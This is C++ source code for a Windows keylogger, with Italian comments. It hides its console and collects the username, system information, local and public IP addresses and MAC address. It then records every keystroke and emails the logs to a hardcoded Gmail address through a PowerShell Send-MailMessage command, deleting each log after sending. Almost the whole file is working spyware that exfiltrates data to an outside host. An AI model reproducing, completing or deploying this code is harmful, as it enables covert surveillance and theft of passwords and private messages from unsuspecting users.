//La %UserProfile% e è una speciale variabile di ambiente a livello di sistema che Contiene%SystemDrive%\Users\{username}
//%SYSTEMROOT% è la directory in cui sono archiviati i file principali dei sistemi operativi Windows. ricorda i path dell variabili di ambiente

#include <iostream>  //Input/output
#include <windows.h> //Serve per nascondere la console quando il programma.exe viene eseguito (https://it.wikipedia.org/wiki/Windows.h)
#include <winuser.h> //è utilizzata  controlli e la lettura delle keys in Windows  https://docs.microsoft.com/en-us/windows/win32/winauto/header-and-lib-files
#include <ctime>     //utile per ottenere e manipolare le informazioni su data e ora
#include <fstream>   //Input/output per operare sui file.
#include <string>    //utile per manipolare le stringhe
#include <Lmcons.h>  //https://zetcode.com/gui/winapi/system/ utile per tutte le win api riferite al sistema
#include <dir.h>     //contiene funzioni per eseguire operazioni sulle directory
#include <conio.h>   //input-output della console
#include <stdio.h>
using namespace std;
//Variabili Globali
//string location;
string systemuser;
string Email_To_Recieve_On = "ssof.2022@gmail.com";
string Email_To_Send_From = "ssof.2022@gmail.com";
string Password_Of_Sender_Email = "";

void getusername(void) // viene usata  Lmcons per ricavare l'username
{
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    systemuser = username;
}

void gettime(void) //prende e scrive data ed ora locali del sistema .
{
    string path;
    ofstream sysfile;
    path = getenv("appdata");
    path += "\\Logs\\SystemInfo.txt";
    sysfile.open(path.c_str(), ios::app);
    time_t now = time(0);
    char *dt = ctime(&now);
    sysfile << "La data e l'ora locali sono: " << dt << endl;
    sysfile.close();
}

//SEZIONE INFORMAZIONI RELATIVE ALLA MACCHINA
void showsysteminfo(void) //Funzione che permette di memorizzare le informazioni di sistema in un file
{
    SYSTEM_INFO siSysInfo;     ///Prendo le informazioni e le memorizzzo in una struttura che chiamo siSysInfo
    GetSystemInfo(&siSysInfo); //Otteniamo le informazioni dalla struttura

    //I dati vengono memorizzati nel file SystemInfo.txt

    string path;
    ofstream sysfile;
    path = getenv("appdata");
    path += "\\Logs\\SystemInfo.txt";
    sysfile.open(path.c_str(), ios::out); // apertura del file(sysfile) che conterra tutte le informazioni di sitema sottostante

    sysfile << "Informazioni Hardware : \n";

    sysfile << "Numero di processori:" << siSysInfo.dwNumberOfProcessors << endl; //Otteniamo il numero di processori dalla variabile dwNumberOfProcessors dalla struttura siSysInfo

    sysfile << "Ram: " << siSysInfo.dwPageSize << endl; //otteniamo la quantità di ram installata dalla variabile dwPageSize sempre dalla struttura siSysInfo

    sysfile << "Tipo di processore: " << siSysInfo.dwProcessorType << endl; //otteniamo il tipo di processore dalla variabile dwProcessorType

    sysfile << "Nome Utente sistema: " << systemuser; //nome utente della macchina

    sysfile << "\n\n\n";

    sysfile.close(); //chiusura file.
}

inline void hideconsole(void) //Questo funzione viene dalla libreria Windows.h utilissima per nasconde la console quando viene eseguito il programma
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

// test di comandi lanciati dal cmd con system (funzionaa!!)
void storemacaddress(void) //Digita il comando in cmd e memorizza il risultato in un file
{
    system(("getmac>%USERPROFILE%\\AppData\\Roaming\\Logs\\MacAddress.txt"));
}

void storeipddress(void) //Digita il comando in cmd e memorizza il risultato in un file
{
    system(("ipconfig>%USERPROFILE%\\AppData\\Roaming\\Logs\\IPAddress.txt"));
}
void storexternalip(void)
{
    system("nslookup myip.opendns.com resolver1.opendns.com>%USERPROFILE%\\AppData\\Roaming\\Logs\\publicip.txt");
}

//SEZIONE INVIO EMAIL

void sendemail(string email1, string message, string password, string subject, string mailto, string filename)
{

    string command_email = "%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  \"$password = '" + password + "' | ConvertTo-SecureString -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential('" + email1 + "', $password);Send-MailMessage -ErrorAction Stop -from '" + email1 + "' -to '" + mailto + "' -subject '" + subject + "' -body '" + message + "'  -SmtpServer 'smtp.gmail.com' -Attachments '" + filename + "' -Priority  'Normal' -Credential $credential -Port 587 -UseSsl;Write-Output 'Email Sent'\"";
    system(command_email.c_str());
}
void sendlog(void) ///Avvia la  powershell ed esegue lo script per inviare l'email.
{

    sendemail(Email_To_Send_From, "Log File", Password_Of_Sender_Email, "Log file", Email_To_Recieve_On, "%USERPROFILE%\\AppData\\Roaming\\Logs\\Log.txt");
}

void sendinfo(void) ///Avvia la  powershell ed esegue lo script per inviare l'email.
{
    sendemail(Email_To_Send_From, "System Info", Password_Of_Sender_Email, "System Info", Email_To_Recieve_On, "%USERPROFILE%\\AppData\\Roaming\\Logs\\SystemInfo.txt");
    sendemail(Email_To_Send_From, "Ip Address", Password_Of_Sender_Email, "IP Address", Email_To_Recieve_On, "%USERPROFILE%\\AppData\\Roaming\\Logs\\IPAddress.txt");
    sendemail(Email_To_Send_From, "Mac Address", Password_Of_Sender_Email, "Mac Address", Email_To_Recieve_On, "%USERPROFILE%\\AppData\\Roaming\\Logs\\MacAddress.txt");
    sendemail(Email_To_Send_From, "Public IP", Password_Of_Sender_Email, "Public IP", Email_To_Recieve_On, "%USERPROFILE%\\AppData\\Roaming\\Logs\\publicip.txt");
}

//utile per la permanenza nei registri di windows
/*void getlocation(void) //trova la directory corrente dell'applicazione
{
    char tuh[_MAX_PATH];
    char *abc;
    abc = getcwd(tuh, sizeof(tuh));
    location = abc;
}*/

//check per la partenza del programma appere la barra del volume

/*void turnofvoice()
{
    INPUT ip = {0};
    ip.type = INPUT_KEYBOARD;
    ip.ki.wVk = VK_VOLUME_MUTE;
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
}*/

//SEZIONE KEYLOGGER
void keylog(void) //Key logger
{
    char c;
    int count = 0;
    while (true)
    {

        for (c = 7; c <= 130; c++) // Eseguo il ciclo dell'intera tabella ascii e controllo se il tasto è premuto
        {
            if (count == 90) //appena il target ha scritto 90 caratteri il file di log viene inoltrato tramite email
            {
                sendlog();                                                    //invio
                system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\log.txt"); //cancello il file
                count = 0;                                                    // riporto count a zero
            }
            //La funzione GetAsyncKeyState interroga lo stato corrente dei tasti della tastiera (al momento della chiamata).
            //GetAsyncKeyState possiede due keystate in due bit diversi:
            //bit 15 - lo stato in tempo reale della chiave è che è tenuto premuto
            //bit 0 - il tasto è stato appena premuto, quindi è appena passato da rilasciato->premuto
            //Il valore - 32767 è uguale a 0x8001 per un valore a 16 bit con segno. Pertanto, GetAsyncKeyState(i) == -32767)controlla 3 cose:
            //1) il tasto è attualmente tenuto premuto
            //2) il tasto è appena passato da rilasciato->premuto
            //3) tutti gli altri bit in GetAsyncKeyState sono zero (che può o non può essere sempre vero)
            //http: //msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
            if (GetAsyncKeyState(c) == -32767)
            {
                count++; //contatore caratteri

                string path;
                ofstream write;
                path = getenv("appdata");
                path += "\\Logs\\Log.txt";
                write.open(path.c_str(), ios::out | ios::app);

                if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    c += 32;
                    write << c;
                    write.close();
                    break;
                }
                else if ((c > 64) && (c < 91))
                {

                    write << c;
                    write.close();
                    break;
                }
                else
                {

                    switch (c)
                    {
                    case 43:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "+";
                        else
                            write << "*";
                    }
                    break;
                    case 44:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << ",";
                        else
                            write << ";";
                    }
                    break;
                    case 45:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "-";
                        else
                            write << "_";
                    }
                    break;
                    case 46:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << ".";
                        else
                            write << ":";
                    }
                    break;
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "=";
                        else
                            write << "0";
                    }
                    break;

                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "!";
                        else
                            write << "1";
                    }
                    break;

                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "''";
                        else
                            write << "2";
                    }
                    break;
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "£";
                        else
                            write << "3";
                    }
                    break;
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "$";
                        else
                            write << "4";
                    }
                    break;
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "%";
                        else
                            write << "5";
                    }
                    break;
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "&";
                        else
                            write << "6";
                    }
                    break;
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "/";
                        else
                            write << "7";
                    }
                    break;
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "(";
                        else
                            write << "8";
                    }
                    break;
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << ")";
                        else
                            write << "9";
                    }
                    break;

                    case VK_SPACE:
                        write << " ";
                        break;
                    case VK_RETURN:
                        write << "\n";
                        break;
                    case VK_TAB:
                        write << "  ";
                        break;
                    case VK_BACK:
                        write << "<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write << "<Del>";
                        break;

                    //https://docs.microsoft.com/it-it/windows/win32/inputdev/virtual-key-codes
                    //invece di usare ASCII
                    case VK_SHIFT:
                        write << "<Shift>";
                        break;

                    case VK_CONTROL:
                        write << "<Control>";
                        break;

                    case VK_ESCAPE:
                        write << "<Escape>";
                        break;

                    case VK_END:
                        write << "<End>";
                        break;

                    case VK_HOME:
                        write << "<Home>";
                        break;

                    case VK_LEFT:
                        write << "Left>";
                        break;

                    case VK_UP:
                        write << "Up";
                        break;

                    case VK_RIGHT:
                        write << "<Right>";
                        break;

                    case VK_DOWN:
                        write << "<Down>";
                        break;
                    }
                }
            }
        }
    }
}

int main()
{
    hideconsole();
    system("mkdir %USERPROFILE%\\AppData\\Roaming\\Logs");
    //turnofvoice();
    //getlocation();
    getusername();
    storexternalip();
    storeipddress();
    showsysteminfo();
    gettime();
    storemacaddress();
    sendinfo();
    keylog();
    sendlog();
    return 0;
}
